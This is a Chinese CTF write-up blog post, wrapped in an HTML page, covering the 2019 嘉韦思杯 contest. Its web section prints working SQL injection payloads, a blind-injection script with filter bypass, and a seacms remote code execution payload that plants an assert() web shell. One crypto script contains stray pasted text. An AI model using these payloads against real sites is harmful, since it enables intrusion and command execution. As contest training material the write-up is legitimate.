@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="向来拿不起,也放不下。QQ:1807801293">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Yogurt">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="嘉韦思杯线上赛"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="向来拿不起,也放不下。QQ:1807801293" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Yogurt"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>嘉韦思杯线上赛 - Yogurt</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=990 height=86 src="//music.163.com/outchain/player?type=2&id=1299711624&auto=1&height=66"></iframe>
+<header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2019/03/31/嘉韦思杯/">
+                嘉韦思杯线上赛
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-03-31</span>
+            
+            
+                <a href="#disqus_thread" class="comments">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="土肥原-flag-20-welcome-19"><a href="#土肥原-flag-20-welcome-19" class="headerlink" title="土肥原:flag{20_welcome_19}"></a>土肥原:flag{20_welcome_19}</h2><p>这是一个sql注入题，比较简单<a id="more"></a></p>
+<p><code>&#39; union select (select database()),2,3,4 #</code></p>
+<p>数据库：luozhen</p>
+<p><code>&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4 #</code></p>
+<p>表：flag</p>
+<p><code>&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),3,4 #</code></p>
+<p>列名:flag</p>
+<p><code>&#39; union select 1,(select flag from flag),3,4 #</code></p>
+<p><img src="/2019/03/31/嘉韦思杯/1wp.png" alt="1wp"></p>
+<h2 id="池步洲-flag-Y0u-just-br0ke-sha1"><a href="#池步洲-flag-Y0u-just-br0ke-sha1" class="headerlink" title="池步洲:flag{Y0u_just_br0ke_sha1}"></a>池步洲:flag{Y0u_just_br0ke_sha1}</h2><p>通过查看源代码发现<code>&lt;!--index.phps--&gt;</code>，于是下载下来index.phps，代码审计一下，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;********&apos;;</span><br><span class="line">if (isset($_POST[&apos;name&apos;]) and isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">	if ($_POST[&apos;name&apos;] == $_POST[&apos;password&apos;])</span><br><span class="line">		print &apos;name and password must be diffirent&apos;;</span><br><span class="line">	else if (sha1($_POST[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;]))</span><br><span class="line">		die($flag);</span><br><span class="line">	else print &apos;invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="作战计划-flag-seacms"><a href="#作战计划-flag-seacms" class="headerlink" title="作战计划:flag{!!seacms_@@}"></a>作战计划:flag{!!seacms_@@}</h2><p>打开后发现是一个cms，马上意识到是要找cms的漏洞，之前知道seacms有前台任意代码执行漏洞，试了试，发现刚好可以。</p>
+<p><code>(http://47.103.43.235:84/search.php?searchtype=5&amp;tid=6&amp;year=2014);phpinfo();//)</code></p>
+<p><img src="/2019/03/31/嘉韦思杯/seacms1.png" alt="seacms1"><br>然后，</p>
+<p><code>http://47.103.43.235:84/search.php?searchtype=5&amp;tid=6&amp;year=2014);assert($_POST[&quot;raidsh&quot;]);//</code></p>
+<p>post：radish=system(“cat $(find / -name flag*)”)</p>
+<p>得到flag</p>
+<p>其实在做题中碰到这种cms的题，方向一般都是找特定cms的漏洞。</p>
+<h2 id="冈村宁次-flag-s9li-1s-s0-e4sY"><a href="#冈村宁次-flag-s9li-1s-s0-e4sY" class="headerlink" title="冈村宁次:flag{s9li_1s_s0_e4sY}"></a>冈村宁次:flag{s9li_1s_s0_e4sY}</h2><p>网址为：<code>http://47.103.43.235:83/web/a/index.php?id===QM</code></p>
+<p>刚开始以为是简单的注入，后来没结果，后来觉得后边的像base64.解码发现是1的意思。1 base64编码的逆序输出。</p>
+<p>于是开始我的测试：</p>
+<p>传递参数：if(1,1,2) 编码后为：pIDLxwSMoYWa</p>
+<p><img src="/2019/03/31/嘉韦思杯/1.png" alt="1"></p>
+<p>再传递参数：if(0,1,2) 编码后为：pIDLxwCMoYWa</p>
+<p><img src="/2019/03/31/嘉韦思杯/2.png" alt="2"></p>
+<p>发现了回显。</p>
+<p>于是利用脚本跑出flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&quot;utf8&quot;)</span><br><span class="line"></span><br><span class="line">def string_reverse(m):</span><br><span class="line">    s = base64.b64encode(m)</span><br><span class="line">    num=len(s)</span><br><span class="line">    a=&quot;&quot;</span><br><span class="line">    for i in range(num):</span><br><span class="line">        a += s[num-1-i]</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line">url =&quot;http://47.103.43.235:83/web/a/index.php?id=&quot;</span><br><span class="line">flag =&quot;&quot;</span><br><span class="line">for i in range(1,40):</span><br><span class="line">	for j in range(33,128):</span><br><span class="line">		# playload = &quot;if((ascii(substr(database(),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot;</span><br><span class="line">		# playload = &quot;if((ascii(substr((selselectect/*a*/group_concat(table_name)/*a*/from/*a*/infoorrmation_schema.tables/*a*/ where/*a*/table_schema/*a*/like/*a*/ database()),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot;  </span><br><span class="line">		# playload = &quot;if((ascii(substr((selselectect/*a*/ group_concat(column_name)/*a*/ from /*a*/infoorrmation_schema.columns/*a*/ where/*a*/ table_name/*a*/like/*a*/&apos;flag&apos;),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; </span><br><span class="line">		playload = &quot;if((ascii(substr((seleselectct/*a*/flag /*a*/from/*a*/ flag),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot;</span><br><span class="line">		# print playload</span><br><span class="line">		# exit()</span><br><span class="line">		playload = string_reverse(playload)</span><br><span class="line">		# print playload</span><br><span class="line">		r=requests.get(url+playload)</span><br><span class="line">		# print url+playload</span><br><span class="line">		# print r.text</span><br><span class="line">		# exit()</span><br><span class="line">		if &quot;2019-11-11&quot; in r.text:</span><br><span class="line">			flag += str(chr(j))</span><br><span class="line">			print flag</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+<h2 id="大美晚报-flag-d6-YX-m-aa0"><a href="#大美晚报-flag-d6-YX-m-aa0" class="headerlink" title="大美晚报:flag{d6@YX$_m^aa0}"></a>大美晚报:flag{d6@YX$_m^aa0}</h2><p>这题打开是一个二维码，我先用记事本查看了一下文件，发现了“管理员使用了他的QQ号进行加密”，和“key.txt”。于是果断放到kali里binwalk了一下，然后foremost 了index.png,得到了一个压缩包，根据提示，爆破压缩包密码为674290437<br>得到flag</p>
+<h2 id="戴星炳-flag-Y0U-4R3-3o-F4ST"><a href="#戴星炳-flag-Y0U-4R3-3o-F4ST" class="headerlink" title="戴星炳:flag{Y0U_4R3_3o_F4ST!}"></a>戴星炳:flag{Y0U_4R3_3o_F4ST!}</h2><p>这题一看就知道人工计算是不可能得到flag的，必须用脚本了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line">body = r.get(&quot;http://47.103.43.235:82/web/a/index.php&quot;)</span><br><span class="line"></span><br><span class="line">print(body.text)</span><br><span class="line"></span><br><span class="line">jisuan = re.findall(&apos;？&lt;/p&gt;&lt;p&gt;(.*?)&lt;/p&gt;&apos;,body.text)</span><br><span class="line"></span><br><span class="line">flag = eval(jisuan[0])</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line">data1 = &#123;</span><br><span class="line">        &apos;result&apos;: flag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = r.post(&quot;http://47.103.43.235:82/web/a/index.php&quot;,data=data1)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure></p>
+<h2 id="晴气庆胤-flag-MD5-success"><a href="#晴气庆胤-flag-MD5-success" class="headerlink" title="晴气庆胤:flag{MD5@_@success}"></a>晴气庆胤:flag{MD5@_@success}</h2><p>这题post传参即可</p>
+<p>param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;<br>param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="潘汉年-flag-c4es4r-variation"><a href="#潘汉年-flag-c4es4r-variation" class="headerlink" title="潘汉年:flag{c4es4r_variation}"></a>潘汉年:flag{c4es4r_variation}</h2><p><img src="/2019/03/31/嘉韦思杯/3.png" alt="3"></p>
+<p>打开是一个字符串bg[<code>sZ*Zg&#39;dPfP</code>VM_SXVd，一脸懵。</p>
+<p>经过多种猜测和试验后，试到ascii码。</p>
+<p>bg[<code>sZ*Zg&#39;dPfP</code>VM_SXVd的ASCII码为：</p>
+<p>98,103,91,96,115,90,42,90,103,39,100,80,102,80,96,86,77,95,83,88,86,100</p>
+<p>flag的ASCII码为：</p>
+<p>102,108,97,103</p>
+<p>他们的第一位 相差4 第二位相差5 第三位相差6<br>于是脚本来了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str = &quot;bg[`sZ*Zg&apos;dPfP`VM_SXVd&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">j=4于是脚本来了：</span><br><span class="line"></span><br><span class="line">for i in range(len(str)):</span><br><span class="line">	flag += chr(ord(str[i])+j)</span><br><span class="line">	j = j+1</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+<h2 id="日军空袭-flag-B64-amp-2hai-14i"><a href="#日军空袭-flag-B64-amp-2hai-14i" class="headerlink" title="日军空袭:flag{B64_&amp;_2hai_14i}"></a>日军空袭:flag{B64_&amp;_2hai_14i}</h2><p>Base64反复解码，最后得到fB__l621a4h4g_ai{&amp;i}，然后找f、l、a、g、发现他们直接相隔四个字符，找到了规律。得到flag。</p>
+<h2 id="死亡真相-flag-hsd132456"><a href="#死亡真相-flag-hsd132456" class="headerlink" title="死亡真相:flag{hsd132456}"></a>死亡真相:flag{hsd132456}</h2><p>用Audacity打开文件，查看频谱图，  得到flag：85a9d4517d4725_b9_8cbc9fd_554216 因为文件多次提到zero，将_变为0，再用md5解密  得到flag。<br><img src="/2019/03/31/嘉韦思杯/1.jpg" alt="1"></p>
+<h2 id="吴佩孚-flag-sdf465454dfgert32"><a href="#吴佩孚-flag-sdf465454dfgert32" class="headerlink" title="吴佩孚:flag{sdf465454dfgert32}"></a>吴佩孚:flag{sdf465454dfgert32}</h2><p>刚开始是一个base64,然后Jsfuck就可以得到flag。</p>
+<h2 id="袁殊-flag-2o-9-CTF-ECUN"><a href="#袁殊-flag-2o-9-CTF-ECUN" class="headerlink" title="袁殊:flag{_2o!9_CTF_ECUN_}"></a>袁殊:flag{_2o!9_CTF_ECUN_}</h2><p>简单浏览题和文件之后  在互联网上查阅到一道题目，与该题极为相似,就是出自“i春秋第二届春秋欢乐赛”。</p>
+<p>解题步骤：</p>
+<p>下载文件解压：得到两个文件</p>
+<p>用kali linux的 openssl openssl rsa -pubin -text -modulus -in warmup -in RSA256/RSA256/gy.key</p>
+<p><img src="/2019/03/31/嘉韦思杯/rsa256.png" alt="rsa256"></p>
+<p>得到：</p>
+<p>Public-Key: (256 bit)</p>
+<p>Modulus:</p>
+<p> 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd:</p>
+<p> c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0:</p>
+<p> 89:12:d9</p>
+<p>Exponent: 65537 (0x10001)</p>
+<p>Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</p>
+<p>writing RSA key</p>
+<p>—–BEGIN PUBLIC KEY—–</p>
+<p>MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni</p>
+<p>0bXTcqTQiRLZAgMBAAE=</p>
+<p>—–END PUBLIC KEY—–</p>
+<p>可以看到Exponent: 65537，这里成为e</p>
+<p>n的十六进制是Modules：A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</p>
+<p>用python转成转成十进制：</p>
+<p><img src="/2019/03/31/嘉韦思杯/rsa2.png" alt="rsa2"></p>
+<p>再将n进行因式分解来得到我p和q (使用<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a>)</p>
+<p><img src="/2019/03/31/嘉韦思杯/4.png" alt="4"></p>
+<p>p=273821108020968288372911424519201044333</p>
+<p>q=280385007186315115828483000867559983517</p>
+<p>最后写好脚本，得出flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8 </span><br><span class="line"></span><br><span class="line">import gmpy </span><br><span class="line"></span><br><span class="line">import rsa </span><br><span class="line"></span><br><span class="line">p = 273821108020968288372911424519201044333 </span><br><span class="line"></span><br><span class="line">q = 280385007186315115828483000867559983517 </span><br><span class="line"></span><br><span class="line">n = 76775333340223961139427050707840417811156978085146970312315886671546666259161 </span><br><span class="line"></span><br><span class="line">e = 65537 </span><br><span class="line"></span><br><span class="line">d = int(gmpy.invert(e , (p-1) * (q-1))) </span><br><span class="line"></span><br><span class="line">privatekey = rsa.PrivateKey(n , e , d , p , q)      #根据已知参数，计算私钥 </span><br><span class="line"></span><br><span class="line">with open(&quot;./fllllllag.txt&quot; , &quot;rb&quot;) as f: </span><br><span class="line"></span><br><span class="line">print(rsa.decrypt(f.read(), privatekey).decode())       #使用私钥对密文进行解密，并打印</span><br></pre></td></tr></table></figure>
+<p>需要<br>注意的一点是，fllllllag.txt的路径一定要对。<br><img src="/2019/03/31/嘉韦思杯/rsa3.png" alt="rsa3"></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/wp/">#wp</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+    <div class="comments">
+        
+<div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+    </div>
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    希望每个人都能找到自己的不可替代。
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/04/09/掘安杯CTF/">掘安杯CTF</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/04/03/docker基本概念/">docker基本概念</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/03/31/嘉韦思杯/">嘉韦思杯线上赛</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/03/27/python——基础/">python——基础</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/报错/">报错</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/docker/">docker</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/python/">python</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/随笔/">随笔</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:1807801293@qq.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    This is Yogurt
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'klugjotest';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+
+</html>
